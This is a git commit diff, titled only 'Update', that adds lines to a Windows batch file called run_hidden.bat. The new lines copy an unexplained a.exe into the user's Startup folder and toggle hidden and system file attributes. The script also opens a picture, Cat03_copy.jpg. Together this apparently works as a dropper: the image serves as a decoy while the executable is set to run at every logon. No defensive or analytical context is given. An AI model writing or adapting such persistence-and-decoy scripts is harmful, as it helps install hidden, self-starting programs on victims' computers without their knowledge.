532cfd8d545090fe52764d99c404ef3682839be9
Hải Đăng Hàn <darkstarcfvn.com>
2025-02-23 14:05:57 +0700

    Update

--- run_hidden.bat
+++ run_hidden.bat
@@ -1,5 +1,8 @@
 @echo off
+copy "a.exe" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\a.exe"
 taskkill /F /IM a.exe >nul 2>&1
+attrib -h -s "a.exe"
+attrib +h +s Cat03_copy.jpg
 @REM timeout /t 2 >nu
 start Cat03_copy.jpg
 @REM timeout /t 2 >nul
